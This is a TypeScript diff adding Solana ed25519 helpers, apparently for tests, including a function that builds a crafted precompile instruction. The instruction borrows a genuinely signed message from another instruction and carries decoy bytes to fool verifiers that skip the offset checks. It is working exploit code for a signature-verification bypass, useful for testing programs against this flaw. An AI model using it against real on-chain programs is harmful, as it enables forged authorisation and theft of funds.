@@ -209,3 +209,63 @@ export const SPL = {
 };
 
 export { BN, PublicKey, Keypair };
+
+/**
+ * Layout `Ed25519Program.createInstructionWithPublicKey` produces: a 2-byte
+ * header, one 14-byte offsets struct, then the public key, the signature and
+ * the message, back to back.
+ */
+export const ED25519_PUBKEY_OFFSET = 16;
+export const ED25519_SIGNATURE_OFFSET = 48;
+export const ED25519_MESSAGE_OFFSET = 112;
+
+/** Sentinel in the offsets struct meaning "this same instruction". */
+const THIS_INSTRUCTION = 0xffff;
+
+/** Pulls the 64 signature bytes out of a normally built ed25519 instruction. */
+export function ed25519SignatureOf(instruction: TransactionInstruction): Buffer {
+  return Buffer.from(
+    instruction.data.subarray(ED25519_SIGNATURE_OFFSET, ED25519_SIGNATURE_OFFSET + 64),
+  );
+}
+
+/**
+ * Builds an ed25519 instruction that points the native program at a message
+ * living in *another* instruction of the transaction, while carrying different
+ * bytes at the same offset in its own data.
+ *
+ * The signature is genuine, so the precompile passes. A verifier that reads the
+ * message straight out of this instruction's data — without checking that the
+ * offsets say "this instruction" — sees `decoyMessage` and is fooled.
+ */
+export function ed25519WithBorrowedMessage(options: {
+  pubkey: PublicKey;
+  signature: Buffer;
+  decoyMessage: Buffer;
+  messageInstructionIndex: number;
+  messageOffset: number;
+  messageSize: number;
+}): TransactionInstruction {
+  const { pubkey, signature, decoyMessage, messageInstructionIndex } = options;
+  const data = Buffer.alloc(ED25519_MESSAGE_OFFSET + decoyMessage.length);
+
+  data.writeUInt8(1, 0); // one signature
+  data.writeUInt8(0, 1); // padding
+  data.writeUInt16LE(ED25519_SIGNATURE_OFFSET, 2);
+  data.writeUInt16LE(THIS_INSTRUCTION, 4);
+  data.writeUInt16LE(ED25519_PUBKEY_OFFSET, 6);
+  data.writeUInt16LE(THIS_INSTRUCTION, 8);
+  data.writeUInt16LE(options.messageOffset, 10);
+  data.writeUInt16LE(options.messageSize, 12);
+  data.writeUInt16LE(messageInstructionIndex, 14);
+
+  pubkey.toBuffer().copy(data, ED25519_PUBKEY_OFFSET);
+  signature.copy(data, ED25519_SIGNATURE_OFFSET);
+  decoyMessage.copy(data, ED25519_MESSAGE_OFFSET);
+
+  return new TransactionInstruction({
+    keys: [],
+    programId: Ed25519Program.programId,
+    data,
+  });
+}
